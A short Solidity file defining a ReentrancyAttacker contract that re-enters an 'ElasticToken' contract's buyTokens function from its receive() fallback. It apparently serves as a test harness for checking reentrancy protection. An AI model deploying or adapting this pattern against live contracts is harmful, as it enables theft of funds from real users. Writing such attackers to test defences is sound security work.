// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IElasticToken {
    function buyTokens(string memory symbol, uint256 minTokensOut) external payable returns (uint256);
    function sellTokens(string calldata symbol, uint256 tokenAmount) external;
}

contract ReentrancyAttacker {
    IElasticToken public token;
    bool attacking = false;
    
    constructor(address _token) {
        token = IElasticToken(_token);
    }
    
    function attack() external payable {
        attacking = true;
        token.buyTokens{value: 1 ether}("BTC", 0);
    }
    
    receive() external payable {
        if (attacking) {
            attacking = false;
            token.buyTokens{value: 1 ether}("BTC", 0);
        }
    }
}
